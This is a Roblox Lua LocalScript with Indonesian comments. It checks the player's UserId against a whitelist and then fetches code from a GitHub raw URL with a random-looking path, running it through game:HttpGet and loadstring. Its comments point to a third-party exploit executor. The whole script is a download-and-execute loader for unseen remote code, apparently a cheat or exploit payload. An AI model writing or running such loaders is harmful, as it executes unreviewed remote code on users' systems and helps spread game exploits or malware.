-- LocalScript (put in StarterPlayerScripts)
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Masukkan UserId yang diizinkan (contoh)
local ALLOWED_IDS = {
    12345678, -- ganti dengan UserId asli
    87654321  -- tambah sesuai kebutuhan
}

local function isAllowed(id)
    for _, v in ipairs(ALLOWED_IDS) do
        if v == id then return true end
    end
    return false
end

-- URL script remote (pakai URL yang kamu berikan)
local SCRIPT_URL = "https://raw.githubusercontent.com/PremiumVersion/csvegrgrrgr/refs/heads/main/grhghrgrgrrghrhrhrgrfewfeklgbhervuirgyuegfeyrfgreyfgruy8rgregr8gr87gftryregfer8r"

-- Pastikan LocalPlayer sudah tersedia (biasanya sudah)
if not player then
    Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
    player = Players.LocalPlayer
end

if not isAllowed(player.UserId) then
    -- Jika tidak diizinkan, hentikan eksekusi
    warn("Access Denied: your UserId is not allowed to run this script.")
    return
end

-- Jika diizinkan, ambil dan jalankan remote script
local ok, err = pcall(function()
    local http = game:GetService("HttpService")
    -- Attempt to fetch; HttpGet bisa dibatasi oleh environment/executor
    local remoteCode = game:HttpGet(SCRIPT_URL)
    local fn = loadstring(remoteCode)
    if type(fn) == "function" then
        fn()
    else
        error("Loaded content is not a function")
    end
end)

if not ok then
    warn("Failed to run remote script:", err)
end
